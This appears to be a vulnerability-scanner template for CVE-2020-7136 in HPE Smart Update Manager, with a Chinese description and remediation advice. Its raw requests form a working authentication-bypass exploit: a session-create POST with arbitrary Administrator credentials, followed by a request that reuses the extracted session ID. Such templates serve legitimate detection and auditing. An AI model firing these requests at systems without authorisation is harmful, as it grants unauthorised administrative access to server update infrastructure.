id: CVE-2020-7136
info:
  name: HPE Smart Update Manager < 8.5.6 - Remote Unauthorized Access
  author:
  - l0ne1y
  description: |-
    HPE Smart Update Manager 访问限制绕过漏洞
    HPE Smart Update Manager（SUM）是美国慧与公司（Hewlett Packard Enterprise，HPE）的一款智能更新管理器。该产品主要用于安装和更新HP ProLiant和HP Integrity服务器、机箱和选件上的固件和软件组件。

    HPE Smart Update Manager (SUM) 8.5.6之前版本中存在安全漏洞。远程攻击者可利用该漏洞绕过访问限制。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbmu03997en_us

    临时修复方案：
    1、前后端同时对用户输入信息进行校验，双重验证机制。
    2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - hmessage
    - Command completed successfully.
    - node_name
  extractors:
  - name: sessionid
    type: regex
    regex:
    - '"sessionId":"([a-z0-9.]+)"'
    group: 1
    part: body
    internal: true
  raw:
  - |
    POST /session/create HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: application/json

    {"hapi":{"username":"Administrator","password":"any_password","language":"en","mode":"gui", "usesshkey":true, "privatekey":"any_privateky", "passphrase":"any_passphase","settings":{"output_filter":"passed","port_number":"444"}}}
  - |
    GET /session/{{sessionid}}/node/index HTTP/1.1
    Host: {{Hostname}}
